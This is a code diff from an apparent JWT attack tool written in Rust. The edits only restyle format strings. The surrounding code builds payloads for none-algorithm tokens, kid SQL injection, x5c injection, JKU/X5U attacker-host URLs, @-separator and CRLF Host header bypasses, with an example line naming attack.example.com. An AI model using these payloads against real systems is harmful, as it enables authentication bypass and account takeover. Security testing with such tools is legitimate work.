@@ -21,7 +21,7 @@ pub fn execute(
         utils::format_jwt_token(token)
     ));
     if let Err(e) = generate_payloads(token, jwk_trust, jwk_attack, jwk_protocol, target) {
-        utils::log_error(format!("Error generating payloads: {}", e));
+        utils::log_error(format!("Error generating payloads: {e}"));
         utils::log_error("e.g jwt-hack payload {JWT_CODE} --jwk-attack attack.example.com --jwk-trust trust.example.com --target none,jku,alg_confusion");
     }
 }
@@ -124,7 +124,7 @@ fn generate_payloads(
                         .bright_cyan()
                         .bold()
                 );
-                println!("{}", payload);
+                println!("{payload}");
                 println!();
             }
         }
@@ -143,7 +143,7 @@ fn generate_payloads(
                     "\n{}",
                     "━━━ kid SQL Injection Payload ━━━".bright_cyan().bold()
                 );
-                println!("{}", payload);
+                println!("{payload}");
                 println!();
             }
         }
@@ -162,7 +162,7 @@ fn generate_payloads(
                     "\n{}",
                     "━━━ x5c Header Injection Payload ━━━".bright_cyan().bold()
                 );
-                println!("{}", payload);
+                println!("{payload}");
                 println!();
             }
         }
@@ -183,7 +183,7 @@ fn generate_payloads(
                         .bright_cyan()
                         .bold()
                 );
-                println!("{}", payload);
+                println!("{payload}");
                 println!();
             }
         }
@@ -203,10 +203,7 @@ fn generate_none_payloads(claims: &str, alg_value: &str) -> Result<()> {
     });
 
     let header_json = serde_json::to_string(&header)?;
-    info!(
-        "Generate {} payload header=\"{}\" payload={}",
-        alg_value, header_json, alg_value
-    );
+    info!("Generate {alg_value} payload header=\"{header_json}\" payload={alg_value}");
 
     // Base64 encode the header for JWT format
     let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
@@ -214,7 +211,7 @@ fn generate_none_payloads(claims: &str, alg_value: &str) -> Result<()> {
     // Format as JWT token without signature (none algorithm attack)
     println!(
         "\n{}",
-        format!("━━━ None Algorithm Payload ({}) ━━━", alg_value)
+        format!("━━━ None Algorithm Payload ({alg_value}) ━━━")
             .bright_cyan()
             .bold()
     );
@@ -260,15 +257,12 @@ fn generate_url_payloads(
         });
 
         let header_json = serde_json::to_string(&header)?;
-        info!(
-            "Generate {} + basic payload header=\"{}\" payload={}",
-            key_type, header_json, key_type
-        );
+        info!("Generate {key_type} + basic payload header=\"{header_json}\" payload={key_type}");
 
         let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
         println!(
             "\n{}",
-            format!("━━━ JKU/X5U Basic Payload ({}) ━━━", key_type)
+            format!("━━━ JKU/X5U Basic Payload ({key_type}) ━━━")
                 .bright_cyan()
                 .bold()
         );
@@ -291,14 +285,13 @@ fn generate_url_payloads(
 
             let header_json = serde_json::to_string(&header)?;
             info!(
-                "Generate {} host validation payload header=\"{}\" payload={}",
-                key_type, header_json, key_type
+                "Generate {key_type} host validation payload header=\"{header_json}\" payload={key_type}"
             );
 
             let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
             println!(
                 "\n{}",
-                format!("━━━ Z-Separator Bypass Payload ({}) ━━━", key_type)
+                format!("━━━ Z-Separator Bypass Payload ({key_type}) ━━━")
                     .bright_cyan()
                     .bold()
             );
@@ -310,7 +303,7 @@ fn generate_url_payloads(
             println!();
 
             // Generate @-separator URL validation bypass payload
-            let bypass_at_url = format!("{}://{}@{}", jwk_protocol, trust_domain, jwk_attack);
+            let bypass_at_url = format!("{jwk_protocol}://{trust_domain}@{jwk_attack}");
             let header = json!({
                 "alg": "hs256",
                 key_type: bypass_at_url,
@@ -319,14 +312,13 @@ fn generate_url_payloads(
 
             let header_json = serde_json::to_string(&header)?;
             info!(
-                "Generate {} host validation payload header=\"{}\" payload={}",
-                key_type, header_json, key_type
+                "Generate {key_type} host validation payload header=\"{header_json}\" payload={key_type}"
             );
 
             let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
             println!(
                 "\n{}",
-                format!("━━━ @-Separator Bypass Payload ({}) ━━━", key_type)
+                format!("━━━ @-Separator Bypass Payload ({key_type}) ━━━")
                     .bright_cyan()
                     .bold()
             );
@@ -338,10 +330,7 @@ fn generate_url_payloads(
             println!();
 
             // Generate CRLF-based Host header injection payload
-            let crlf_url = format!(
-                "{}://{}%0d0aHost: {}",
-                jwk_protocol, trust_domain, jwk_attack
-            );
+            let crlf_url = format!("{jwk_protocol}://{trust_domain}%0d0aHost: {jwk_attack}");
             let header = json!({
                 "alg": "hs256",
                 key_type: crlf_url,
@@ -350,14 +339,13 @@ fn generate_url_payloads(
 
             let header_json = serde_json::to_string(&header)?;
             info!(
-                "Generate {} host header injection (w/CRLF) payload header=\"{}\" payload={}",
-                key_type, header_json, key_type
+                "Generate {key_type} host header injection (w/CRLF) payload header=\"{header_json}\" payload={key_type}"
             );
 
             let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
             println!(
                 "\n{}",
-                format!("━━━ CRLF Injection Payload ({}) ━━━", key_type)
+                format!("━━━ CRLF Injection Payload ({key_type}) ━━━")
                     .bright_cyan()
                     .bold()
             );
@@ -398,7 +386,7 @@ mod tests {
             general_purpose::URL_SAFE_NO_PAD.encode(payload.to_string().as_bytes());
 
         // Create a simple test token
-        format!("{}.{}.signature", header_encoded, payload_encoded)
+        format!("{header_encoded}.{payload_encoded}.signature")
     }
 
     #[test]
